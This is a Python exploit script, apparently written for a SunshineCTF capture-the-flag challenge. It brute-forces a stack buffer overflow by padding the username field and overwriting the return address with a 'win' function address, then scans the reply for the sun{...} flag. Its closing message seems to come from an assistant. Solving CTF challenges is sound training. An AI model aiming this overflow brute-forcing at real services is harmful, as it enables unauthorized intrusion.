#!/usr/bin/env python3
import socket, re, time

HOST = "sunshinectf.games"
PORT = 25701

WIN16 = b"\x36\x02"        # 0x0236
WIN32 = b"\x36\x02\x00\x00"

OFFSETS = list(range(32, 193))  # broadened range

def recv_until(sock, needles, timeout=6.0):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if any(n in data for n in needles):
                break
    except Exception:
        pass
    return data

def try_once(offset, ra, eol=b"\n"):
    s = socket.create_connection((HOST, PORT), timeout=6)
    _ = recv_until(s, [b"Enter username", b"username", b"Username", b":"], timeout=6.0)
    # username (overflow) + password line
    s.sendall(b"A"*offset + ra + eol)
    time.sleep(0.15)
    s.sendall(b"p@ss" + eol)
    out = b""
    s.settimeout(4.0)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            m = re.search(rb"sun\{[^\r\n]*\}", out)
            if m:
                s.close()
                return True, m.group(0).decode('utf-8', 'ignore'), out
    except Exception:
        pass
    s.close()
    return False, "", out

def main():
    tried = 0
    for eol in (b"\n", b"\r\n"):
        for ra in (WIN16, WIN32):
            for off in OFFSETS:
                tried += 1
                ok, flag, raw = try_once(off, ra, eol=eol)
                if ok:
                    print(f"[+] HIT offset={off}, RA_len={len(ra)}, EOL={'CRLF' if eol==b'\\r\\n' else 'LF'} -> {flag}")
                    print(raw.decode('utf-8','ignore'))
                    return
    print("[-] No flag found in 32..192. Consider that @win address might differ; dump symbols locally or share output and we'll adapt.")

if __name__ == "__main__":
    main()
